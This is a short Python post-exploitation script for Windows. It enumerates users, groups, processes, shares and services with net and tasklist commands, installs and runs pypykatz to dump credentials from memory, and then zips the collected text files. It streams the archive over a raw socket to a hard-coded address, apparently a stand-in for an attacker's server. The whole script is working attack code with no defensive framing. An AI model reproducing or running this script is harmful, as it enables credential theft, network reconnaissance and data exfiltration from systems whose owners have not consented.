import subprocess
import os
import zipfile
import socket
try:
    localgroup=subprocess.check_output("net localgroup",shell=True)
    with open("localgroup.txt", 'wb') as file:
        file.write(localgroup)
except:
    pass
try:
    user=subprocess.check_output("net user",shell=True)
    with open("user.txt", 'wb') as file:
        file.write(user)
except:
    pass
try:
    group=subprocess.check_output("net group",shell=True)
    with open("group.txt", 'wb') as file:
        file.write(group)
except:
    pass
try:
    tasklist=subprocess.check_output("tasklist /v",shell=True)
    with open("tasklist.txt", 'wb') as file:
        file.write(tasklist)
except:
    pass
try:
    netuse=subprocess.check_output("net use",shell=True)
    with open("netuse.txt", 'wb') as file:
        file.write(netuse)
except:
    pass
try:
    netstart=subprocess.check_output("net start",shell=True)
    with open("netstart.txt", 'wb') as file:
        file.write(netstart)
except:
    pass
try:
    os.system("pip3 install pypykatz")
except:
    pass
try:
    os.system("pypykatz.py rekall dump -t 0")
    print("pypykatz is finished.")
except:
    pass

try:
    file_zip = zipfile.ZipFile('file.zip', 'w')
    for folder, subfolders, files in os.walk('.'):
        for file in files:
            if file.endswith('.txt'):
                file_zip.write(os.path.join(folder, file),
                              os.path.relpath(os.path.join(folder, file), '.'),
                              compress_type=zipfile.ZIP_DEFLATED)
    file_zip.close()
    print("Files are compressed.")
    s = socket.socket()
    s.connect(("127.0.0.1", 80))
    with open("file.zip", "rb") as f:
        while True:
            bytes_read = f.read(4096)
            if not bytes_read:
                break
            s.sendall(bytes_read)
    s.close()
    print("Zip file sent.")
except:
    pass